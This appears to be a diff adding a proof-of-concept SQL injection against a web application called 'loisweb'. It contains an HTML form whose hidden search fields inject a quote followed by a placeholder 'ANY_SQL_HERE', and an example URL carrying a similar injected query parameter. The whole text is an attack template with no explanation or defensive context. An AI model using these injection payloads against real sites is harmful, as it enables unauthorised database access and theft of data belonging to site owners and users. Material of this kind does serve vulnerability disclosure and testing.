@@ -1,0 +1,10 @@
+<form action="http://host/loisweb/index.asp?topic=./links/search" method="POST" >
+<input type="hidden" name="qs" value="847" >
+<input type="hidden" name="Search0" value="' ANY_SQL_HERE" >
+<input type="hidden" name="Search1" value="' ANY_SQL_HERE" >
+<input type="hidden" name="Search2" value="' ANY_SQL_HERE" >
+<input type="hidden" name="Search3" value="' ANY_SQL_HERE" >
+<input type=submit>
+</form>
+
+http://www.example.com/loisweb/index.asp?topic=./links/results&resultstype=1&qs=396&qt=+qaq++[5]+%3D+%27%27+ANY_SQL_HERE
